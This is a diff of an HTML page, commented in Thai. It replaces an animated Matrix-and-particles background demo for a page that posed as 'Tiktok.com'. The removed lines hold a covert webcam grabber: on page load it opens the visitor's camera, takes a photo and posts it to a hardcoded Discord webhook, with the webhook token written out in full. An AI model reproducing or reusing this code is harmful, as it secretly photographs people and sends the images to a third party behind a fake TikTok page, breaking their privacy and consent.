@@ -2,100 +2,216 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8">
-  <title>Tiktok.com</title>
+  <title>Animated Background Demo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- ใช้ฟ้อนต์และสีแบบเว็บพอร์ต -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'web3-darker': '#111827',
+          },
+          fontFamily: {
+            space: ['Space Grotesk', 'sans-serif'],
+          }
+        }
+      }
+    }
+  </script>
 
   <style>
     body {
       margin: 0;
-      padding: 0;
-      font-family: system-ui, sans-serif;
-
-      /* ⭐ ใส่รูปพื้นหลังเต็มจอ */
-      background-image: url('https://cdn.discordapp.com/attachments/1439099287224193126/1439107786507161671/TikTok.png?ex=69195111&is=6917ff91&hm=ec2bd69bbeb96888f71d4bb7126d3055d157b0b9f5ccf3eecd08ce8aaa518d2f&'); /* ← เปลี่ยนตรงนี้ */
-      background-size: cover;       /* ครอบเต็ม */
-      background-position: center;  /* ตรงกลาง */
-      background-repeat: no-repeat; /* ไม่ซ้ำ */
-      height: 100vh;
-
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-
-      color: #fff;
+      font-family: 'Space Grotesk', sans-serif;
+      overflow: hidden;
     }
-
-    video, canvas, img {
-      display: none;
+    /* pattern + scan line */
+    .grid-pattern{
+      background-image:
+        linear-gradient(rgba(156,163,175,.05) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(156,163,175,.05) 1px,transparent 1px);
+      background-size:50px 50px;
+      animation:grid-move 20s linear infinite;
     }
-
-    #status {
-      font-size: 14px;
-      margin-top: 15px;
+    @keyframes grid-move{
+      0%{background-position:0 0}
+      100%{background-position:50px 50px}
     }
+    .scan-line{position:relative;overflow:hidden}
+    .scan-line::after{
+      content:'';
+      position:absolute;
+      inset:0;
+      height:2px;
+      background:linear-gradient(90deg,transparent,rgba(156,163,175,.8),transparent);
+      animation:scan 3s linear infinite;
+    }
+    @keyframes scan{0%{transform:translateY(0)}100%{transform:translateY(100vh)}}
+
+    /* mouse trail */
+    .mouse-trail{
+      position:fixed;
+      width:20px;
+      height:20px;
+      border-radius:50%;
+      background:radial-gradient(circle,rgba(209,213,219,0.6),transparent);
+      pointer-events:none;
+      filter:blur(2px);
+      transition:transform 0.1s ease-out;
+      z-index:30;
+    }
+    .mouse-trail-1{background:radial-gradient(circle,rgba(139,92,246,0.8),transparent);}
+    .mouse-trail-2{background:radial-gradient(circle,rgba(59,130,246,0.8),transparent);}
+    .mouse-trail-3{background:radial-gradient(circle,rgba(6,182,212,0.8),transparent);}
+    .mouse-trail-4{background:radial-gradient(circle,rgba(236,72,153,0.8),transparent);}
+    .mouse-trail-5{background:radial-gradient(circle,rgba(251,146,60,0.8),transparent);}
+    .mouse-trail-6{background:radial-gradient(circle,rgba(34,197,94,0.8),transparent);}
   </style>
 </head>
+<body class="bg-web3-darker text-gray-100">
 
-<body>
+  <!-- Matrix -->
+  <canvas id="matrix-canvas" class="fixed inset-0 pointer-events-none" style="z-index:0"></canvas>
+  <!-- Particles -->
+  <canvas id="particles-canvas" class="fixed inset-0 pointer-events-none" style="z-index:1"></canvas>
+  <!-- Grid & scan-line -->
+  <div class="fixed inset-0 grid-pattern opacity-30 pointer-events-none z-0"></div>
+  <div class="scan-line fixed inset-0 pointer-events-none z-10"></div>
 
-  <video id="video" playsinline autoplay></video>
-  <canvas id="canvas"></canvas>
-  <img id="photo" alt="preview">
-  <p id="status"></p>
+  <!-- Mouse trail -->
+  <div id="mouse-trail-container"></div>
+
+  <!-- Content กลางจอ -->
+  <div class="relative z-20 h-screen flex items-center justify-center">
+    <div class="text-center px-6">
+      <h1 class="text-4xl md:text-5xl font-bold mb-4">
+        Animated Background
+      </h1>
+      <p class="text-gray-400">
+        ตัวอย่างพื้นหลังเคลื่อนไหวแบบ Matrix + particles เอาไปใช้กับโปรเจกต์อื่นได้เลย
+      </p>
+    </div>
+  </div>
 
   <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1439099868172914708/T625tkrkZPF4QkAcHPbMxTErYuoahL6ZAFm_Kt5bDxYIupTf-iz8Dp6KUGLRKjIWkGBn";
+    // ===== MATRIX RAIN =====
+    const matrixCanvas = document.getElementById('matrix-canvas');
+    const matrixCtx = matrixCanvas.getContext('2d');
+    const resizeMatrix = () => {
+      matrixCanvas.width = innerWidth;
+      matrixCanvas.height = innerHeight;
+    };
+    resizeMatrix();
+    const matrixChars = 'ا ب ت ث ج ح خ د ذ ر ز س ش ص ض ط ظ ع غ ف ق ك ل م ن هـ و ي ٠ ١ ٢ ٣ ٤ ٥ ٦ ٧ ٨ ٩';
+    const fontSize = 14;
+    let columns = Math.floor(matrixCanvas.width / fontSize);
+    const drops = Array(columns).fill(1);
+    const matrixColors = ['#8B5CF6','#3B82F6','#06B6D4','#EC4899','#FB923C','#22C55E'];
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const photo = document.getElementById('photo');
-    const statusText = document.getElementById('status');
+    function drawMatrix() {
+      matrixCtx.fillStyle='rgba(17,24,39,0.05)';
+      matrixCtx.fillRect(0,0,matrixCanvas.width,matrixCanvas.height);
+      matrixCtx.font = fontSize+'px monospace';
+      for(let i=0;i<drops.length;i++){
+        const ch = matrixChars[Math.floor(Math.random()*matrixChars.length)];
+        matrixCtx.fillStyle = matrixColors[i % matrixColors.length];
+        matrixCtx.shadowBlur = 10;
+        matrixCtx.shadowColor = matrixColors[i % matrixColors.length];
+        matrixCtx.fillText(ch,i*fontSize,drops[i]*fontSize);
+        matrixCtx.shadowBlur = 0;
+        if(drops[i]*fontSize>matrixCanvas.height && Math.random()>0.975) drops[i]=0;
+        drops[i]++;
+      }
+    }
+    setInterval(drawMatrix,50);
 
-    async function startCapture() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    // ===== PARTICLES =====
+    const particlesCanvas = document.getElementById('particles-canvas');
+    const particlesCtx = particlesCanvas.getContext('2d');
+    const resizeParticles = () => {
+      particlesCanvas.width = innerWidth;
+      particlesCanvas.height = innerHeight;
+    };
+    resizeParticles();
 
-        video.srcObject = stream;
-
-        await new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            video.play();
-            resolve();
-          };
-        });
-
-        await new Promise(r => setTimeout(r, 700));
-
-        const width = video.videoWidth;
-        const height = video.videoHeight;
-
-        canvas.width = width;
-        canvas.height = height;
-
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, width, height);
-
-        const dataURL = canvas.toDataURL('image/png');
-        photo.src = dataURL;
-
-        const blob = await (await fetch(dataURL)).blob();
-        const filename = "capture-" + Date.now() + ".png";
-
-        const form = new FormData();
-        form.append("file", blob, filename);
-        form.append("content", "📸 Auto-captured by art.github.io");
-
-        await fetch(WEBHOOK_URL, { method: "POST", body: form });
-
-        stream.getTracks().forEach(t => t.stop());
-      } catch (err) {
-        console.error(err);
+    class Particle{
+      constructor(){
+        this.x=Math.random()*particlesCanvas.width;
+        this.y=Math.random()*particlesCanvas.height;
+        this.size=Math.random()*3+1;
+        this.vx=Math.random()*0.5-0.25;
+        this.vy=Math.random()*0.5-0.25;
+        const colors = [
+          {fill:'#8B5CF6',glow:'rgba(139,92,246,0.8)'},
+          {fill:'#3B82F6',glow:'rgba(59,130,246,0.8)'},
+          {fill:'#06B6D4',glow:'rgba(6,182,212,0.8)'},
+          {fill:'#EC4899',glow:'rgba(236,72,153,0.8)'},
+          {fill:'#FB923C',glow:'rgba(251,146,60,0.8)'},
+          {fill:'#22C55E',glow:'rgba(34,197,94,0.8)'}
+        ];
+        this.colorObj = colors[Math.floor(Math.random()*colors.length)];
+      }
+      update(){
+        this.x+=this.vx;
+        this.y+=this.vy;
+        if(this.x>particlesCanvas.width)this.x=0;
+        if(this.x<0)this.x=particlesCanvas.width;
+        if(this.y>particlesCanvas.height)this.y=0;
+        if(this.y<0)this.y=particlesCanvas.height;
+      }
+      draw(){
+        particlesCtx.shadowBlur=15;
+        particlesCtx.shadowColor=this.colorObj.glow;
+        particlesCtx.fillStyle=this.colorObj.fill;
+        particlesCtx.beginPath();
+        particlesCtx.arc(this.x,this.y,this.size,0,Math.PI*2);
+        particlesCtx.fill();
+        particlesCtx.shadowBlur=0;
       }
     }
 
-    window.onload = startCapture;
-  </script>
+    const particles = Array.from({length:100},()=>new Particle());
+    function animateParticles(){
+      particlesCtx.clearRect(0,0,particlesCanvas.width,particlesCanvas.height);
+      particles.forEach(p=>{p.update(); p.draw();});
+      requestAnimationFrame(animateParticles);
+    }
+    animateParticles();
 
+    // ===== MOUSE TRAIL =====
+    const trailContainer = document.getElementById('mouse-trail-container');
+    const trails = [];
+    const maxTrails = 20;
+    const trailColors = ['mouse-trail-1', 'mouse-trail-2', 'mouse-trail-3', 'mouse-trail-4', 'mouse-trail-5', 'mouse-trail-6'];
+    for(let i=0; i<maxTrails; i++){
+      const trail = document.createElement('div');
+      trail.className = `mouse-trail ${trailColors[i % trailColors.length]}`;
+      trail.style.opacity = (1 - i/maxTrails) * 0.7;
+      trail.style.transform = `scale(${1 - i/maxTrails})`;
+      trailContainer.appendChild(trail);
+      trails.push(trail);
+    }
+    let mouseX = 0, mouseY = 0;
+    document.addEventListener('mousemove', e => {
+      mouseX = e.clientX;
+      mouseY = e.clientY;
+      trails.forEach((trail, i) => {
+        setTimeout(() => {
+          trail.style.left = mouseX - 10 + 'px';
+          trail.style.top = mouseY - 10 + 'px';
+        }, i * 15);
+      });
+    });
+
+    // ===== RESIZE =====
+    addEventListener('resize', () => {
+      resizeMatrix();
+      resizeParticles();
+      columns = Math.floor(matrixCanvas.width/fontSize);
+    });
+  </script>
 </body>
 </html>
